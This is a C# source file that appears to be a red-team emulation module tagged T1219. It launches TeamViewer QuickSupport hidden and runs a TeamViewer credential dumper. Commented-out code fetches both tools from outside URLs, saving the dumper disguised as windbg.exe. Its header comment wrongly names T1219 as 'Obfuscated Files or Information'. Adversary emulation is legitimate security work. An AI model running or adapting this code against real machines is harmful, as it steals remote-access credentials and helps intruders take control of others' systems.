using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Threading;

class Technique
{
/*
    * 
    * T1219 (Obfuscated Files or Information).
    *
    *       TODO
    *       download https://download.teamviewer.com/download/TeamViewerQS.exe
    *       download https://github.com/attackercan/teamviewer-dumper/raw/master/tv-dumper.exe - This could possibly be inserted into our own code, reducing the dependencies
    *       execute teamviewer
    *       wait a couple seconds
    *       execute tv-dumper.exe
    *       kill teamviewer
*/

    public static Dictionary<string, string> EntryData { get; set; }
    public static Dictionary<string, string> ExitData { get; set; }

    public static bool execCommand(string TeamViewer, string Dumper)
    {
        try
        {

//            Console.WriteLine("DEBUG downloading files;");
//            WebClient webClient = new WebClient();
//            webClient.DownloadFile(TeamViewer,@"\Users\Public\TeamViewer.exe");
//            webClient.DownloadFile(Dumper, @"\Users\Public\windbg.exe");

            System.Diagnostics.Process tvProcess = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();

            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = @"\Users\Public\TeamViewerQS.exe";
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;

            Console.WriteLine("DEBUG Starting tv process;");
            tvProcess.StartInfo = startInfo;
            if (tvProcess.Start() == true){
                System.Diagnostics.Process dumperProcess = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo dumperInfo = new System.Diagnostics.ProcessStartInfo();

                dumperInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                dumperInfo.FileName = @"\Users\Public\tv-dumper.exe";
                dumperInfo.RedirectStandardOutput = true;
                dumperInfo.UseShellExecute = false;

                //Sleep to wait for teamviewer
                Thread.Sleep(5000);

                Console.WriteLine("DEBUG Starting tv dumper process;");
                dumperProcess.StartInfo = dumperInfo;
                dumperProcess.Start();
                dumperProcess.WaitForExit();
                if (dumperProcess.ExitCode == 0)
                {
                    tvProcess.Kill();
                    return true;
                }
            }
            Console.WriteLine(tvProcess.StandardOutput.ReadToEnd());
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error:" + ex.Message);
        }
        return false;
    }
    public static void Main(string[] args)
    {
        string TV = "https://download.teamviewer.com/download/TeamViewerQS.exe";
        string Dumper = "https://github.com/attackercan/teamviewer-dumper/raw/master/tv-dumper.exe";

        Console.WriteLine("[T1219] Starting Execution!");

        Console.WriteLine("[T1219] Dropping TV + TV Dumper.");
        if (execCommand(TV, Dumper)){
            Console.WriteLine("[T1219] Successfully executed Technique (return 0)! ");
        }else{
            Console.WriteLine("[T1219] Oops, something went wrong! ");
        }
    }
}